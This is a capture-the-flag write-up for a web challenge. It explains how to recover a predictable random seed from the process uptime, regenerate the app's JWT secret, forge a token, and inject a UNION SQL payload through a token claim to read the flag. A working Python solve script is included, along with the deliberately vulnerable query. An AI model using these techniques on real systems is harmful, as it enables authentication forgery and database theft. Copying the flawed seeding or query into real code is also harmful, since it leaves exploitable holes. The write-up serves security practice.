# Write up to solve it

With the code under your eyes, it's easy to see that you can get the seed of the random module with :
- the PID which is always 1 in Docker (only "process") / or at least bruteforceable
- the time which you can get thanks to the uptime of /healthz

Now that you have the seed, you can retrieve the JWT key used to make new JWT tokens.

But what should you modify ? Well there is a very poorly implemented SQL query :

```python
favorite_product = db.session.execute(text("SELECT * FROM product WHERE id = " + str(favorite_product_id))).fetchone()
```

So a simple SQL injection will do the trick : 

```python
# extract from the solve.py shown later on
payload_json["favorite_product"] = "-1 UNION SELECT 1,1,flag,1,1,1 FROM Flag"
```
The `-1` is important, you DON'T WANT TO FIND an actual product, otherwise it's the one that will fetched by `.fetchone()`

Here is a full script to solve :

```python
import requests, json, time, math, random, string
import base64
import hmac
import hashlib

URL = "http://localhost:5000/"

s = requests.Session()

def retrieve_secret():
    r = s.get(URL + "healthz")
    return math.floor(time.time() - r.json()["uptime"])

res = [retrieve_secret() for _ in range(10)]
# get the most common value to be sure
secret = max(set(res), key = res.count)

random.seed(secret+ 1) # PID is always gonna be 1 in the docker :)

# random 32 characters
_ = [random.choice(string.printable) for _ in range(32)]
# then the key 

JWT_SECRET_KEY = "".join(random.choice(string.printable) for _ in range(32))
print(secret, JWT_SECRET_KEY)

# modify a JWT token using the secret key

# The JWT token you want to modify - retrieve it using requests.Session or manually
jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczMDc1MjIyOSwianRpIjoiODZlZjJiZmItMWZiMy00MzNlLWEwNGUtMjFjMTU4YzQ1ZTViIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImEiLCJuYmYiOjE3MzA3NTIyMjksImV4cCI6MTczMDc1MzEyOSwiZmF2b3JpdGVfcHJvZHVjdCI6Mn0.BvBCHqKurJlHl1fMuxuUHvXbvnlQqElDu25ufoeWR8g"

# Split JWT into header, payload, and signature
header, payload, signature = jwt.split(".")

# Base64 decode the payload
payload_bytes = base64.urlsafe_b64decode(payload + "==")
payload_json = json.loads(payload_bytes)

# Modify the payload
payload_json["favorite_product"] = "-1 UNION SELECT 1,1,flag,1,1,1 FROM Flag"

# Re-encode the payload to base64
new_payload = base64.urlsafe_b64encode(json.dumps(payload_json).encode()).decode().replace("=", "")

# Recalculate the signature with the new payload
new_signature = hmac.new(
    key=JWT_SECRET_KEY.encode(),
    msg=f"{header}.{new_payload}".encode(),
    digestmod=hashlib.sha256
).digest()

# Base64 encode the new signature
new_signature_encoded = base64.urlsafe_b64encode(new_signature).decode().replace("=", "")

# Reconstruct the modified JWT
new_jwt = f"{header}.{new_payload}.{new_signature_encoded}"

# Send the new JWT token (assuming session `s` is already set up)
r = s.get(URL + "/favorite_product_info", cookies={"access_token_cookie": new_jwt})
print(r.text)
```
